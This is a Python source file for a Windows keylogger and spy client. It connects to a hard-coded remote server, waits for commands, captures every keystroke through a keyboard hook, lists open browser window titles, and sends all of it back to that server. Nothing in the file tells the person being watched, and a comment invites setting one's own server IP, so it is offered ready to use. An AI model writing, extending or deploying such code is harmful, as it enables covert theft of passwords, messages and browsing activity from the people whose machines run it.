import socket
import threading
from pynput import keyboard
import win32gui
import win32process
import psutil
import time

SERVER_IP = '192.188.8.87'  # Change to your server IP
PORT = 5555

client = socket.socket()
client.connect((SERVER_IP, PORT))

# Global buffer for keystrokes
log_buffer = ""

# Known browsers to detect window titles from
BROWSERS = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe']

def get_browser_tabs():
    tabs = []

    def enum_windows(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                proc = psutil.Process(pid)
                if proc.name().lower() in BROWSERS:
                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        tabs.append(f"[{proc.name()}] {title}")
            except:
                pass
        return True

    win32gui.EnumWindows(enum_windows, None)
    return tabs

def on_press(key):
    global log_buffer
    try:
        log_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer += " "
        elif key == keyboard.Key.enter:
            log_buffer += "\n"
        else:
            log_buffer += f" [{str(key)}] "

    # Send logs if buffer gets large
    if len(log_buffer) > 50:
        try:
            client.send(log_buffer.encode())
        except:
            pass
        log_buffer = ""

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def send_tabs():
    tabs = get_browser_tabs()
    if tabs:
        for tab in tabs:
            client.send(tab.encode())
            time.sleep(0.05)
    client.send(b"[ENDTABS]")

def main():
    keylogger_listener = None
    while True:
        try:
            cmd = client.recv(1024).decode()
        except:
            break

        if not cmd:
            break

        if cmd == 'keylogger':
            if not keylogger_listener:
                keylogger_listener = start_keylogger()
            # Send any buffered logs before waiting for next command
            global log_buffer
            if log_buffer:
                client.send(log_buffer.encode())
                log_buffer = ""
        elif cmd == 'tabs':
            send_tabs()
        elif cmd == 'exit':
            break
        else:
            # Unknown command, ignore or send back error
            pass

    client.close()

if __name__ == "__main__":
    main()
